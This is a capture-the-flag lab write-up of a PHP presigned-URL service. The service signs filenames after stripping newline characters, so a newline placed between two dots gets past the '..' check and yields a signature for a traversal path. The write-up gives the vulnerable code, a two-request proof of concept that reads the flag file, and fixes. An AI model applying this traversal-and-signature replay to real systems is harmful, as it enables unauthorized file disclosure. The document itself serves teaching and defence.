# Vulnerability Report DOJO 50

---

## CRLF Injection via Newline in Filename Bypasses HMAC Signature Verification — Arbitrary File Read

The application implements a presigned URL system to control access to files. Signing is restricted to the `public/` prefix, and path traversal via `..` is explicitly blocked. However, a newline character (`\n`) injected into the filename during the signing step is silently stripped by the sanitization function, causing the generated HMAC signature to cover a path traversal payload (`public/../super_secret.txt`) that was never directly allowed. The resulting signature can then be replayed in a download request where no sanitization occurs, allowing the attacker to read arbitrary files — including `super_secret.txt`.

---

## Root Cause — Step-by-Step Breakdown

The vulnerability chain spans two requests and exploits an asymmetry between the `sign` and `download` code paths.

### The sanitization asymmetry

```php
function sanitizeFilename($filename) {
    return preg_replace('/[\x00-\x1F\x7F]/', '', $filename);  // silently removes \n
}

function generatePresignedUrl($file_path, $secret_key, $expires_in) {
    $file_path = sanitizeFilename($file_path);  // ← applied here
    $string_to_sign = "GET\n/files/{$file_path}\n{$timestamp}";
    // ...
}

function verifySignature($filename, $expires, $signature, $secret_key) {
    $string_to_sign = "GET\n/files/{$filename}\n{$expires}";  // ← NOT sanitized
    // ...
}
```

The `sanitizeFilename` function removes control characters including `\n` (`\x0A`), but only in the signing path. The verification and file-read paths use the raw filename directly.

### The access control checks

```php
// sign path only — never checked on download
if (str_contains($filename, '..')) {
    // blocked
} elseif (!str_starts_with($filename, 'public/')) {
    // blocked
}
```

Neither `..` nor the `public/` prefix check is applied during `download`.

---

## Exploitation — Step-by-Step

### Step 1 — Inject a newline into the filename at signing time

The attacker submits a filename containing a literal newline character between the two dots of a `..` sequence:

```
public/.
./super_secret.txt
```

The security checks see:
- `str_starts_with("public/.\n./super_secret.txt", "public/")` → ✅ passes
- `str_contains("public/.\n./super_secret.txt", "..")` → ✅ no consecutive dots, passes

Then `sanitizeFilename` strips the `\n`, producing:

```
public/../super_secret.txt
```

The HMAC is computed over:

```
GET
/files/public/../super_secret.txt
{expires}
```

The application returns a valid `expires` and `signature` for this path.

### Step 2 — Replay the signature with the resolved path

In a second request, the attacker submits:

```
action    = download
filename  = public/../super_secret.txt
expires   = {expires from step 1}
signature = {signature from step 1}
```

`verifySignature` reconstructs the same string (no sanitization this time, the `\n` is gone because the attacker sends the clean path directly) and the HMAC matches. Then:

```php
$file_path = FILES_DIR . '/' . $filename;
// = 'files/public/../super_secret.txt'
// PHP resolves this to 'files/super_secret.txt'
is_file($file_path) // → true
file_get_contents($file_path) // → flag content
```

The flag is returned in the response.

---

## Impact

An unauthenticated attacker can read **any file** accessible from the `files/` directory, including files explicitly excluded from the signing allowlist. In this case, `super_secret.txt` — which contains the flag — is fully disclosed.

---

## Proof of Concept

### Request 1 — Sign (newline injected between the dots)

| Field | Value |
|---|---|
| `action` | `sign` |
| `filename` | `public/.\n./super_secret.txt` (literal newline between `.` and `.`) |
| `expires` | *(empty)* |
| `signature` | *(empty)* |

**Response:**

```
File Path  : public/. ./super_secret.txt
Expires At : 1775802006
Signature  : G/d33gqPQ9kss4RYY3hseHoBg2cp8RqrLrumDwhpb3k=
```

### Request 2 — Download (path traversal with valid signature)

| Field | Value |
|---|---|
| `action` | `download` |
| `filename` | `public/../super_secret.txt` |
| `expires` | `1775802006` |
| `signature` | `G/d33gqPQ9kss4RYY3hseHoBg2cp8RqrLrumDwhpb3k=` |

**Response:**

```
File Retrieved
Signature verified successfully

<FLAG>
```

**Flag:** `<FLAG>`

---

## Mitigation

### 1. Sanitize the filename before verification, not only before signing

```php
function verifySignature($filename, $expires, $signature, $secret_key) {
    $filename = sanitizeFilename($filename);  // ← add this
    // ...
}
```

### 2. Validate the resolved path stays within the allowed directory

```php
function getFileContents($filename) {
    $base     = realpath(FILES_DIR);
    $resolved = realpath(FILES_DIR . '/' . $filename);

    if ($resolved === false || strpos($resolved, $base . DIRECTORY_SEPARATOR) !== 0) {
        return ['found' => false, 'error' => 'Access denied.'];
    }
    // ...
}
```

### 3. Reject filenames containing path separators or control characters on download

```php
if (preg_match('/[\x00-\x1F\x7F\/\\\\]/', $filename) || str_contains($filename, '..')) {
    // reject
}
```

### 4. Include a canonical path in the signed payload rather than the raw filename

The HMAC should be computed over the **resolved, canonical** path so that any normalization that happens later cannot produce a different effective path than what was signed.

---

## Vulnerability Classification

| Field | Value |
|---|---|
| **Type** | Path Traversal / HMAC Signature Bypass |
| **Vector** | Filename input → newline injection → sanitization asymmetry |
| **Impact** | Arbitrary file read — sensitive file disclosure |
| **Authentication** | Not required |
| **CWE** | CWE-22 (Path Traversal), CWE-116 (Improper Encoding or Escaping) |
